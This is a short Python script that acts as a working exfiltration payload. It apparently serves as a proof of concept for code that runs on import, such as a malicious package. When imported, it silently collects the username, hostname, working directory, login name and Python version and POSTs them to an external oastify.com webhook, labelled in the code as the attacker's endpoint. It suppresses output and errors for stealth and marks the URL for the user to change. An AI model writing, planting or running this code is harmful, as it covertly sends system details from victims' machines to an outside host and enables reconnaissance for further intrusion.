import requests
import subprocess
import os
import urllib.request
import json
import uuid

# Attacker's webhook endpoint
WEBHOOK_URL = "https://3vz70udxj4igjcfhpjsmuyzsnjtah15q.oastify.com/exfil"  # ← CHANGE THIS

def exfiltrate_system_info():
    """Collect and POST system info"""
    try:
        # Gather data
        data = {
            'id': str(uuid.uuid4()),
            'timestamp': subprocess.getoutput("date"),
            'whoami': subprocess.getoutput("whoami"),
            'pwd': os.getcwd(),
            'hostname': subprocess.getoutput("hostname"),
            'python_version': subprocess.getoutput("python --version"),
            'user': os.getlogin()
        }
        
        # POST to attacker server
        req = urllib.request.Request(
            WEBHOOK_URL,
            data=json.dumps(data).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        urllib.request.urlopen(req, timeout=5)
        
       #  print("✅ [POC] System info exfiltrated")  # Stealth confirmation
       
    except Exception as e:
        pass  # Silent fail

# Execute immediately on import
exfiltrate_system_info()
